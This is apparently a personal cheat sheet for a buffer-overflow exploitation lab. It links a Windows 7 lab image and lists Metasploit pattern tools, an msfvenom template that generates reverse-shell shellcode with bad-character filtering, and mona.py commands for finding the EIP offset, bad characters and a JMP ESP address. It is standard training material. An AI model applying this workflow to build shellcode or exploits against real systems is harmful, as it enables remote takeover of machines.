# BOF

Win 7 OVA --> `https://mega.nz/file/EdFWXZCC#5P_qBh0b8FyTQGAEckbZKi1gqs31tOlKpY0B7Z1WYm0`

# Metasploit utilities

### Pattern

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` \
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb`

### Payload

`msfvenom -p <SHELL> LHOST=<IP> LPORT=<PORT> -b "<BADCHARS>" -f python`

# Mona commands

### Set working directory
`!mona config -set workingfolder c:\mona\%p`

### Get EIP offset
`!mona findmsp -distance 600`

### Create bytearray
`!mona bytearray -b "\x00\x0a"`

### Search for badchars
`!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>`

### Search for JMP ESP 
`!mona jmp -r esp -cpb "<FOUND_BADCHARS>"`
